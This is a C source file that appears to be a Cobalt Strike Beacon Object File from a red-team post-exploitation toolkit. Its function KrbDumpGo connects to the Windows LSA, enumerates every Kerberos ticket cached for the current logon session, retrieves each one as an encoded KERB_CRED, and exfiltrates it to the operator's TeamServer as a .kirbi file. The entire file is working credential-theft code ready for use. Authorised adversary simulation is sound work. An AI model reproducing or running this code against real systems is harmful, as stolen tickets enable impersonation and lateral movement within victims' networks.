/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( LsaLookupAuthenticationPackage );
	D_API( LsaCallAuthenticationPackage );
	D_API( LsaDeregisterLogonProcess );
	D_API( LsaFreeReturnBuffer );
	D_API( LsaConnectUntrusted );
	D_API( RtlInitAnsiString );
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/*!
 *
 * Purpose:
 *
 * Queries all the available tickets for the current
 * logon session. Enumerates through each one, and 
 * downloads them to TeamServer.
 *
!*/
VOID KrbDumpGo( _In_ PVOID Argv, _In_ INT Argc )
{
	API					Api;
	datap					Psr;
	ANSI_STRING				Ani;

	ULONG					Bid = 0;
	ULONG					Kid = 0;
	ULONG					RLn = 0;
	NTSTATUS				Pst = STATUS_SUCCESS;

	HANDLE					Lsa = NULL;
	HANDLE					S32 = NULL;
	HANDLE					Ntl = NULL;
	PBUFFER					Out = NULL;
	PKERB_RETRIEVE_TKT_REQUEST		Krt = NULL;
	PKERB_RETRIEVE_TKT_RESPONSE		Krr = NULL;
	PKERB_QUERY_TKT_CACHE_REQUEST		Kcr = NULL;
	PKERB_QUERY_TKT_CACHE_EX_RESPONSE	Res = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );

	/* Extract arguments */
	BeaconDataParse( &Psr, Argv, Argc );
	Bid = BeaconDataInt( &Psr );

	/* Reference ntdll.dll */
	Ntl = LoadLibraryA( "ntdll.dll" );

	if ( Ntl != NULL ) {
		Api.RtlInitAnsiString = C_PTR( GetProcAddress( Ntl, "RtlInitAnsiString" ) );
		Api.RtlAllocateHeap   = C_PTR( GetProcAddress( Ntl, "RtlAllocateHeap" ) );
		Api.RtlFreeHeap       = C_PTR( GetProcAddress( Ntl, "RtlFreeHeap" ) );

		/* Reference secur32.dll */
		S32 = LoadLibraryA( "secur32.dll" );

		if ( S32 != NULL ) {

			/* Build Stack API Table */
			Api.LsaLookupAuthenticationPackage = C_PTR( GetProcAddress( S32, "LsaLookupAuthenticationPackage" ) );
			Api.LsaCallAuthenticationPackage   = C_PTR( GetProcAddress( S32, "LsaCallAuthenticationPackage" ) );
			Api.LsaDeregisterLogonProcess      = C_PTR( GetProcAddress( S32, "LsaDeregisterLogonProcess" ) );
			Api.LsaFreeReturnBuffer            = C_PTR( GetProcAddress( S32, "LsaFreeReturnBuffer" ) );
			Api.LsaConnectUntrusted            = C_PTR( GetProcAddress( S32, "LsaConnectUntrusted" ) );

			/* Connecting to LSA without any information */
			if ( NT_SUCCESS( Api.LsaConnectUntrusted( &Lsa ) ) ) {

				/* Initialize the information about the name */
				Api.RtlInitAnsiString( &Ani, MICROSOFT_KERBEROS_NAME_A );

				/* Lookup the authentication package */
				if ( NT_SUCCESS( Api.LsaLookupAuthenticationPackage( Lsa, &Ani, &Kid ) ) ) {
					/* Allocate a cache request buffer */
					if ( ( Kcr = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( KERB_QUERY_TKT_CACHE_REQUEST ) ) ) != NULL ) {

						/* Ask to acquire a list of tickets */
						Kcr->MessageType = KerbQueryTicketCacheExMessage; 

						/* Query the tickets from Lsa */
						if ( NT_SUCCESS( Api.LsaCallAuthenticationPackage( Lsa, Kid, Kcr, sizeof( KERB_QUERY_TKT_CACHE_REQUEST ), &Res, &RLn, &Pst ) ) ) {
							if ( NT_SUCCESS( Pst ) ) {
								/* Attempt to enumerate and download each ticket */
								for ( INT Idx = 0 ; Idx < Res->CountOfTickets ; ++Idx ) {
									/* Allocate the retrieve ticket request */
									if ( ( Krt = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( KERB_RETRIEVE_TKT_REQUEST ) + Res->Tickets[ Idx ].ServerName.MaximumLength ) ) != NULL ) {
										/* Set request information */
										Krt->MessageType       = KerbRetrieveEncodedTicketMessage;
										Krt->CacheOptions      = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
										Krt->TicketFlags       = Res->Tickets[ Idx ].TicketFlags;
										Krt->TargetName.Buffer = C_PTR( U_PTR( Krt ) + sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
										Krt->TargetName.Length = Res->Tickets[ Idx ].ServerName.Length;
										Krt->TargetName.MaximumLength = Res->Tickets[ Idx ].ServerName.MaximumLength;
										__builtin_memcpy( Krt->TargetName.Buffer, Res->Tickets[ Idx ].ServerName.Buffer, Res->Tickets[ Idx ].ServerName.MaximumLength );

										/* Request the ticket! */
										if ( NT_SUCCESS( Api.LsaCallAuthenticationPackage( Lsa, Kid, Krt, sizeof( KERB_RETRIEVE_TKT_REQUEST ) + Res->Tickets[ Idx ].ServerName.MaximumLength, &Krr, &RLn, &Pst ) ) ) {
											if ( NT_SUCCESS( Pst ) ) {
												/* Create string buffer! */
												if ( ( Out = BufferCreate() ) != NULL ) {

													/* Filter out any '/' characters */
													for ( INT Jdx = 0 ; Jdx < ( Res->Tickets[ Idx ].ServerName.Length / 2 ) ; ++Jdx ) {
														/* Does our buffer contain a / symbol in the server name? */
														if ( Res->Tickets[ Idx ].ServerName.Buffer[ Jdx ] == L'/' ) {
															/* Change to a ':' */
															Res->Tickets[ Idx ].ServerName.Buffer[ Jdx ] = L':';
														};
													};

													/* Create output filename */
													if ( BufferPrintf( Out, 
															   "beacon-%u-%u-%08x-%wZ@%wZ-%wZ.kirbi\0", 
															   Bid,
															   Idx, 
															   Res->Tickets[ Idx ].TicketFlags, 
															   Res->Tickets[ Idx ].ClientName, 
															   Res->Tickets[ Idx ].ServerName, 
															   Res->Tickets[ Idx ].ServerRealm
													) ) 
													{
														/* Download the ticket! */
														BeaconDownload( Krr->Ticket.EncodedTicket, Krr->Ticket.EncodedTicketSize, Out->Buffer );
													};
													/* Free the buffer! */
													Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
													Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
												};
											};
											/* Free the buffer! */
											Api.LsaFreeReturnBuffer( Krr );
										};

										/* Free the retrieve ticket request */
										Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Krt );
									};
								};
							};
							/* Free the return buffer */
							Api.LsaFreeReturnBuffer( Res );
						};

						/* Free the memory from the cache request */
						Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Kcr );
					};
				};
				/* Disconnect from Lsa */
				Api.LsaDeregisterLogonProcess( Lsa );
			};
			/* Dereference */
			FreeLibrary( S32 );
		};

		/* Dereference */
		FreeLibrary( Ntl );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
};
